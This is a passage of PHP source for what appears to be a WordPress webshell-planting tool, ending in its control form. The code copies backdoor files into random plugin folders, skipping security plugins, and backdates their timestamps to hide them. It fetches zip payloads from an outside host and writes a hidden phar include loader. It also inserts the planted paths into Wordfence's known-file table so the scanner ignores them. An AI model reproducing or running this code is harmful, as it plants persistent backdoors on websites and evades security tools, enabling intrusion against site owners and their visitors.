	Global $table_prefix;
	Global $other_url_root;
	Global $suspected;
	Global $all_insert_link_array;
	if(!empty($other_url_root)){
		$url_root=$other_url_root;
	}
	$plugins_array=array();
	traverseDir($plugins_array,$_POST['root']."wp-content");
	shuffle($plugins_array);
	$plugins_1=$plugins_array[0];
	$while_num=0;
	while(strpos($plugins_1,"file-manager")!==false || strpos($plugins_1,"akismet")!==false|| strpos($plugins_1,"wordfence")!==false|| strpos($plugins_1,".w3-cache")!==false||in_array($plugins_1,$all_insert_link_array)){
				  $plugins_1=$plugins_array[$while_num+1];
				  $while_num++;
			}  
 
	if($plugins_1!=NULL){
			$plgin_url_array=explode(":",$plugins_1);
			if(array_key_exists("2",$plgin_url_array)){
				$plgin_url_1=$plgin_url_array[1].":".$plgin_url_array[2];
			}else{
				$plgin_url_1=$plgin_url_array[1];
			}
		$plgin_url_1=str_replace('\\','/',$plgin_url_1);
		$plgin_url_1=trimall($plgin_url_1);
		$plgin_url_1=trimall($plgin_url_1);
		if(!is_file($plgin_url_1.'/index.php'.$suspected)&&!empty($plgin_url_1)){
			@file_put_contents($plgin_url_1.'/index.php'.$suspected,$con);
			@chmod($plgin_url_1.'/index.php'.$suspected,$file_per);
			@touch($plgin_url_1.'/index.php'.$suspected,$time);
			@touch($plgin_url_1,$time);
			if(is_file($plgin_url_1.'/index.php'.$suspected)){
				$plgin_url_1_array=explode('wp-content',$plgin_url_1);
				$all_insert_link_array[]=$plugins_1;
				echo '<font color="green">'."{$name} Is add!".'</font>'."<br/>";
				$inster_link.=$url_root.'wp-content'.$plgin_url_1_array[1].'/index.php'.$suspected;
				if(is_dir($_POST['root'].'wp-content/plugins/wordfence/')){
				insert_database($table_prefix,'wp-content'.$plgin_url_1_array[1].'/index.php'.$suspected);
				}
			}else{
				echo '<font color="red">'."{$name} Is not add!".'</font>'."<br/>";
			}
		}else{
			if(!is_file($plgin_url_1.'/test.php'.$suspected)&&!empty($plgin_url_1)){
			@file_put_contents($plgin_url_1.'/test.php'.$suspected,$con);
			@chmod($plgin_url_1.'/test.php'.$suspected,$file_per);
			@touch($plgin_url_1.'/test.php'.$suspected,$time);
			@touch($plgin_url_1,$time);
			if(is_file($plgin_url_1.'/test.php'.$suspected)){
				$plgin_url_1_array=explode('wp-content',$plgin_url_1);
				$all_insert_link_array[]=$plugins_1;
				echo '<font color="green">'."{$name} Is add!".'</font>'."<br/>";
				$inster_link.=$url_root.'wp-content'.$plgin_url_1_array[1].'/test.php'.$suspected;
				if(is_dir($_POST['root'].'wp-content/plugins/wordfence/')){
				insert_database($table_prefix,'wp-content'.$plgin_url_1_array[1].'/test.php'.$suspected);
				}
			}else{
				echo '<font color="red">'."{$name} Is not add!".'</font>'."<br/>";
			}
		}
		else{
			echo '<font color="red"> '.$name.' is not add </font>'."<br/>";
		}
		}
	 
	}else{
		echo '<font color="red"> Little Ma is not add </font>'."<br/>";
	}
	return $inster_link;
	}
	function insert_ma_root_other($name,$con){
	Global $url_root;
	Global $file_per;
	Global $time;
	Global $table_prefix;
	Global $other_url_root;
	Global $suspected;
	Global $all_insert_link_array;
	if(!empty($other_url_root)){
		$url_root=$other_url_root;
	}
	$plugins_array=array();
	traverseDir($plugins_array,$_POST['root']."wp-content");
	shuffle($plugins_array);
	$plugins_1=$plugins_array[0];
	$while_num=0;
	while(strpos($plugins_1,"file-manager")!==false || strpos($plugins_1,"akismet")!==false|| strpos($plugins_1,"wordfence")!==false|| strpos($plugins_1,".w3-cache")!==false||in_array($plugins_1,$all_insert_link_array)){
				  $plugins_1=$plugins_array[$while_num+1];
				  $while_num++;
			}  
 
	if($plugins_1!=NULL){
			$plgin_url_array=explode(":",$plugins_1);
			if(array_key_exists("2",$plgin_url_array)){
				$plgin_url_1=$plgin_url_array[1].":".$plgin_url_array[2];
			}else{
				$plgin_url_1=$plgin_url_array[1];
			}
		$plgin_url_1=str_replace('\\','/',$plgin_url_1);
		$plgin_url_1=trimall($plgin_url_1);
		$plgin_url_1=trimall($plgin_url_1);
		if(!is_file($plgin_url_1.'/index.php'.$suspected)&&!empty($plgin_url_1)){
			@file_put_contents($plgin_url_1.'/index.php'.$suspected,$con);
			@chmod($plgin_url_1.'/index.php'.$suspected,$file_per);
			@touch($plgin_url_1.'/index.php'.$suspected,$time);
			@touch($plgin_url_1,$time);
			if(is_file($plgin_url_1.'/index.php'.$suspected)){
				$plgin_url_1_array=explode('wp-content',$plgin_url_1);
				$all_insert_link_array[]=$plugins_1;
				echo '<font color="green">'."{$name} Is add!".'</font>'."<br/>";
				$inster_link.=$url_root.'wp-content'.$plgin_url_1_array[1].'/index.php'.$suspected;
				if(is_dir($_POST['root'].'wp-content/plugins/wordfence/')){
				insert_database($table_prefix,'wp-content'.$plgin_url_1_array[1].'/index.php'.$suspected);
				}
			}else{
				echo '<font color="red">'."{$name} Is not add!".'</font>'."<br/>";
			}
		}else{
			if(!is_file($plgin_url_1.'/test.php'.$suspected)&&!empty($plgin_url_1)){
			@file_put_contents($plgin_url_1.'/test.php'.$suspected,$con);
			@chmod($plgin_url_1.'/test.php'.$suspected,$file_per);
			@touch($plgin_url_1.'/test.php'.$suspected,$time);
			@touch($plgin_url_1,$time);
			if(is_file($plgin_url_1.'/test.php'.$suspected)){
				$plgin_url_1_array=explode('wp-content',$plgin_url_1);
				$all_insert_link_array[]=$plugins_1;
				echo '<font color="green">'."{$name} Is add!".'</font>'."<br/>";
				$inster_link.=$url_root.'wp-content'.$plgin_url_1_array[1].'/test.php'.$suspected;
				if(is_dir($_POST['root'].'wp-content/plugins/wordfence/')){
				insert_database($table_prefix,'wp-content'.$plgin_url_1_array[1].'/test.php'.$suspected);
				}
			}else{
				echo '<font color="red">'."{$name} Is not add!".'</font>'."<br/>";
			}
		}
		else{
			echo '<font color="red"> '.$name.' is not add </font>'."<br/>";
		}
		}
	 
	}else{
		echo '<font color="red"> Little Ma is not add </font>'."<br/>";
	}
	return $inster_link;
	}
	
	
	function insert_org_ma($plugin_dir,$file_name,$check_ma_flag,$chama_con,$shuffle=0){
			Global $url_root;
			Global $file_per;
			Global $time;
			Global $con;
			Global $table_prefix;
			$plugins_1=$plugin_dir;
			if($plugins_1!=NULL){
			$plgin_url_array=explode(":",$plugins_1);
			if(array_key_exists("2",$plgin_url_array)){
				$plgin_url_1=$plgin_url_array[1].":".$plgin_url_array[2];
			}else{
				$plgin_url_1=$plgin_url_array[1];
			}
			$plgin_url_1=str_replace('\\','/',$plgin_url_1);
			if(is_file($plgin_url_1."/".$file_name)){
				@chmod($plgin_url_1."/".$file_name,$file_per);
				$plugin_url_con_1=file_get_contents($plgin_url_1."/".$file_name);
				if(strpos($plugin_url_con_1,$check_ma_flag)!==false){
					$plu_1=str_replace(str_replace('\\','/',$_POST['root']),'',$plgin_url_1);
					return array('exist',$url_root.$plu_1."/".$file_name,$plgin_url_1);
				}else{
					 return array('exist_no_add','	',$plgin_url_1);
				}
			}else{
				@file_put_contents($plgin_url_1."/".$file_name,$chama_con);
				@chmod($plgin_url_1."/".$file_name,$file_per);
				@touch($plgin_url_1."/".$file_name,$time);
				@touch($plgin_url_1,$time);
				usleep(500);
				if(is_file($plgin_url_1."/".$file_name)){
					$plu_1=str_replace(str_replace('\\','/',$_POST['root']),'',$plgin_url_1);
					if(is_dir($_POST['root'].'wp-content/plugins/wordfence/')){
					insert_database($table_prefix,$plu_1."/".$file_name);
					}
					return array('new',$url_root.$plu_1."/".$file_name,$plgin_url_1);
				}else{
					return array('add_failed','	',$plgin_url_1);
				}
			}
			}
			else{
				return array('no_plugins_1','	',$plgin_url_1);
			}
		}
		///////////////////zip_ma
		function insert_org_ma_zip($plugin_dir,$check_ma_flag,$shuffle=0){
			Global $url_root;
			Global $file_per;
			Global $time;
			Global $con;
			Global $table_prefix;
			$plugins_1=$plugin_dir;
			if($plugins_1!==NULL){
			$plgin_url_array=explode(":",$plugins_1);
			if(array_key_exists("2",$plgin_url_array)){
				$plgin_url_1=$plgin_url_array[1].":".$plgin_url_array[2];
			}else{
				$plgin_url_1=$plgin_url_array[1];
			}
			$plgin_url_1=str_replace('\\','/',$plgin_url_1);
			$qian_array=array('web','template','');
			$hou_array=array('s','_backup','bk','bak','_log','log');
			$all_zip_array=array('filecontral-changediy.zip','kaylin.zip','ftp-fso.zip','files.zip','new-ma.zip','try-gai.zip');
			$file_name_array=traverseDir_cur_file($plgin_url_1);
			if(empty($file_name_array)){
				$zip_file_name='backup.txt';
				$php_file_name=$qian_array[array_rand($qian_array,1)].$hou_array[array_rand($hou_array,1)].'.php';
			}else{
				srand();
				$file_name=$file_name_array[array_rand($file_name_array,1)];
				if(strpos('.',$file_name)!==false){
					$file_name=explode('.',$file_name);
					srand();
					$zip_file_name=$qian_array[array_rand($qian_array,1)].$file_name[0].$hou_array[array_rand($hou_array,1)].'.txt';
					if(is_file($plgin_url_1.'/'.$zip_file_name)){
						$zip_file_name='.'.$zip_file_name;
					}
					$php_file_name=$qian_array[array_rand($qian_array,1)].$file_name[0].$hou_array[array_rand($hou_array,1)].'.php';
					if(is_file($plgin_url_1.'/'.$php_file_name)){
						$php_file_name='.'.$php_file_name;
					}
				}else{
					srand();
					$zip_file_name=$qian_array[array_rand($qian_array,1)].$file_name.$hou_array[array_rand($hou_array,1)].'.txt';
					if(is_file($plgin_url_1.'/'.$zip_file_name)){
						$zip_file_name='.'.$zip_file_name;
					}
					$php_file_name=$qian_array[array_rand($qian_array,1)].$file_name.$hou_array[array_rand($hou_array,1)].'.php';
					if(is_file($plgin_url_1.'/'.$php_file_name)){
						$php_file_name='.'.$php_file_name;
					}
				}
			}
			srand();
			$chama_con=get_test_Html('http://8.topsale4you.rocks/tong/get_ma/zip/'.$all_zip_array[array_rand($all_zip_array,1)]);
			if(empty($chama_con)){
				return array('add_failed','	',$plgin_url_1);
			}
			if(is_file($plgin_url_1."/".$zip_file_name)){
				@chmod($plgin_url_1."/".$zip_file_name,$file_per);
				return array('exist_no_add','	',$plgin_url_1);
			}else{
				@file_put_contents($plgin_url_1."/".$zip_file_name,$chama_con);
				
				@chmod($plgin_url_1."/".$zip_file_name,$file_per);
				@touch($plgin_url_1."/".$zip_file_name,$time);
				@touch($plgin_url_1,$time);
				usleep(500);
				if(is_file($plgin_url_1."/".$zip_file_name)){
					$plu_1=str_replace(str_replace('\\','/',$_POST['root']),'',$plgin_url_1);
					if(is_dir($_POST['root'].'wp-content/plugins/wordfence/')){
					insert_database($table_prefix,$plu_1."/".$zip_file_name);
					}
					//return array('new',$url_root.$plu_1."/".$zip_file_name,$plgin_url_1);
				}else{
					return array('add_failed','	',$plgin_url_1);
				}
			}
			if(is_file($plgin_url_1."/".$php_file_name)){
				@chmod($plgin_url_1."/".$php_file_name,$file_per);
				return array('exist_no_add','	',$plgin_url_1);
			}else{
				$php_file_phar_encode=base64_encode('phar://'.$zip_file_name.'/log.txt');
				$php_file_con=<<<EOT
<?php
if(isset(\$_GET['user'])&&\$_GET['user']=='{$zip_file_name}'){
	include(base64_decode('{$php_file_phar_encode}'));
}
EOT;
				@file_put_contents($plgin_url_1."/".$php_file_name,$php_file_con);
				@chmod($plgin_url_1."/".$php_file_name,$file_per);
				@touch($plgin_url_1."/".$php_file_name,$time);
				@touch($plgin_url_1,$time);
				usleep(500);
				if(is_file($plgin_url_1."/".$php_file_name)){
					$plu_1=str_replace(str_replace('\\','/',$_POST['root']),'',$plgin_url_1);
					if(is_dir($_POST['root'].'wp-content/plugins/wordfence/')){
					insert_database($table_prefix,$plu_1."/".$php_file_name);
					}
					return array('new',$url_root.$plu_1."/".$php_file_name.'?user='.$zip_file_name,$plgin_url_1);
				}else{
					return array('add_failed','	',$plgin_url_1);
				}
			}
			}
			else{
				return array('no_plugins_1','	',$plgin_url_1);
			}
		}
///////
function insert_database($table_prefix,$url){
	$db_host_srt=constant("DB_HOST");
	if(strpos($db_host_srt,':')!==false){
		$db_host_array=explode(':',$db_host_srt);
		$con=mysqli_connect($db_host_array[0],constant("DB_USER"),constant("DB_PASSWORD"),constant("DB_NAME"),$db_host_array[1]); 
	}else{
		$con=mysqli_connect(constant("DB_HOST"),constant("DB_USER"),constant("DB_PASSWORD"),constant("DB_NAME")); 
	} 
	if (mysqli_connect_errno($con)){ 
		echo "MySQL connect error: " . mysqli_connect_error(); 
	}
	mysqli_set_charset($con,"utf8") or mysql_error();
	if(is_dir($_POST['root'].'wp-content/plugins/wordfence/')){
		$sql = "insert into `".$table_prefix."wfknownfilelist` VALUES(0,\"".$url."\")";
		$res = mysqli_query($con,$sql);
		if($res){
			echo '<font color="green"> '.$url.' add ok db!</font>'."<br/>";
		}else{
			$sql = "insert into `".$table_prefix."wfKnownFileList` VALUES(0,\"".$url."\")";
			$res = mysqli_query($con,$sql);
			if($res){
				echo '<font color="green"> '.$url.' add ok db!</font>'."<br/>";
			}else{
				echo '<font color="red"> '.$url.' db add error!</font>'."<br/>";
			}
		}
	}
	 mysqli_close($con);
}
function deleteDir($path){if(is_dir($path)){$dirs=scandir($path);foreach($dirs as $dir){if($dir!='.'&&$dir!='..'){$sonDir=$path.'/'.$dir;if(is_dir($sonDir)){deleteDir($sonDir);@rmdir($sonDir);}else{@unlink($sonDir);}}}@rmdir($path);}}

function deleteDir_php($path,$find){if(is_dir($path)){$dirs=scandir($path);foreach($dirs as $dir){if($dir!='.'&&$dir!='..'&&strpos($dir,$find)!==false){$sonDir=$path.'/'.$dir;if(is_dir($sonDir)){deleteDir_php($sonDir,$find);@rmdir($sonDir);}else{@unlink($sonDir);}}}@rmdir($path);}}

function str_l_replace($search,$replace,$subject){$pos=strrpos($subject,$search);if($pos!==false){$subject=substr_replace($subject,$replace,$pos,strlen($search));}return $subject;}

function generate_user($length=8){$chars='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';$password='';for($i=0; $i<$length;$i++){$password.=$chars[mt_rand(0,strlen($chars)-1)];}return$password;}

function generate_password($length=8){$chars='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_[]{}<>~+=,.;:/?|';$password='';for($i=0;$i<$length;$i++)
{$password.=$chars[mt_rand(0,strlen($chars)-1)];}return $password;}

function generate_option($length=8){$chars='abcdef0123456789';$password='';for($i=0;$i<$length;$i++){$password.=$chars[mt_rand(0,strlen($chars)-1)];}return $password;}

/////////////////////////////////////////
function scan_dir($dir_name,$dir_flag=1,$time) {
@$dir_handle=opendir($dir_name);
while(false!==($filename=readdir($dir_handle))){
$flag=$dir_flag;
if($filename!='.'&&$filename!='..'){
while($flag>0&&--$flag)
echo '';
if(is_dir($dir_name.$filename)){
	@touch($dir_name.$filename,$time);
	scan_dir($dir_name.$filename.'/',$dir_flag+1,$time);
}
else {
	@touch($dir_name.$filename,$time);
}
}
}
closedir($dir_handle);
}
///////////////////////////////////////////////////////////

$document_name=$_SERVER['DOCUMENT_ROOT'];
if(substr($document_name,-1)!=='/'){
	// $document_name=$document_name;
// }else{
	$document_name=$document_name.'/';
}
echo <<<EOT
<br/>



<form name="input" action="" method="post">
<br/>
root add'/'<br/>
<input type="text" name="root" style="width:300px;" value="{$document_name}"/><br/><br/>
<select name="check">
	<option value="1">test</option>
	<option value="2">test1</option>
	<option value="3">get url root</option>
	<option value="4">DISALLOW all</option>
	<option value="5">get_file</option>
	<option value="6">ping sitemap</option>
	<option value="7">add fun & robot</option>
	<option value="8">del paswd</option>
	<option value="9">touch all file</option>
	</select>

	<select name="moshi">
	<option value="new">new</option>
	<option value="check">check</option>
	<option value="other">other</option>
	</select>
<input type="submit" value="Submit" />
EOT;
?>